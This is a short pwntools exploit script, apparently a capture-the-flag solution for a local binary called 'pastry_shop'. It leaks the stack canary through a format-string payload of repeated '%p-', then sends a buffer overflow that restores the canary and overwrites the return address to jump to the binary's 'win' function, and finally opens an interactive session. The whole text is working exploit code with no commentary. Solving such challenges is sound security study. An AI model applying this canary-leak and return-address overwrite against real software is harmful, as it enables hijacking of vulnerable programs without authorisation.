from pwn import *

context.binary=elf=ELF("./pastry_shop")

p=process(elf.path)
p.recv()
payload=b"%p-"*25
offset=64+8
p.sendline(payload)
leak=p.recv().decode().split("-")[22]


canary=int(leak,16)


payload=flat(
    b'a'*offset,
    p64(canary),
    b'a'*8,
    p64(elf.sym.win)
)
p.sendline(payload)
print(p.recv())
p.interactive()